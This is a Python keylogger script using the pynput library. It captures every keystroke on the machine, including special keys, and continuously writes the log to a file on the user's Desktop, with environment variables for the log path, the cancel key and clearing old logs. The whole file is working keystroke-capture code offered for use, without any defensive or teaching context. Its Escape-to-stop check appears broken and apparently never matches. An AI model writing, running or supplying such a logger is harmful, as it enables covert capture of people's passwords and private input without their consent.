import os
from pynput import keyboard

# Define the log file location: use environment variable or default to ~/Desktop/file.log
log_file = os.getenv('pylogger_file', os.path.expanduser('~/Desktop/file.log'))

# Define the cancel key: use environment variable or default to Escape
cancel_key = os.getenv('pylogger_cancel', 'esc')

# String to hold the key log data
key_log = ""

# Clear the log file if the environment variable 'pylogger_clean' is set
if os.getenv('pylogger_clean'):
    try:
        os.remove(log_file)
    except FileNotFoundError:
        pass  # If file doesn't exist, ignore the error

# Define what happens on key press
def on_press(key):
    global key_log

    try:
        # Handle special keys (space, enter, etc.) with readable labels
        if key == keyboard.Key.space:
            key_log += "<Space>"
        elif key == keyboard.Key.tab:
            key_log += "<Tab>"
        elif key == keyboard.Key.enter:
            key_log += "<Enter>"
        elif key == keyboard.Key.backspace:
            key_log += "<Backspace>"
        else:
            # If it's a normal character, log it as it is
            key_log += key.char
    except AttributeError:
        # Log other special keys (e.g., function keys)
        key_log += f"<{key.name}>"

    # Write to file after every key press
    with open(log_file, 'w') as f:  # Using 'w' to overwrite and keep it horizontal
        f.write(key_log)

# Define what happens on key release (cancel the keylogger if the cancel key is pressed)
def on_release(key):
    if str(key) == f"'{cancel_key}'":  # Compare with the cancel key (escape by default)
        # Stop the listener
        return False

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
